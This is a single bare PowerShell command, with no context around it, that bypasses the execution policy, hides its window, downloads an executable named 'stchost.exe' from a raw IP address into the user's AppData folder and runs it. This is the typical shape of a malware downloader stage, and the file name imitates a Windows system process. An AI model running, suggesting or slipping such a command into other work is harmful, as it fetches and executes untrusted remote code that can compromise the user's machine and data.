
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~yahoo/stchost.exe', $env:APPDATA\stchost.exe );Start-Process ( $env:APPDATA\stchost.exe )

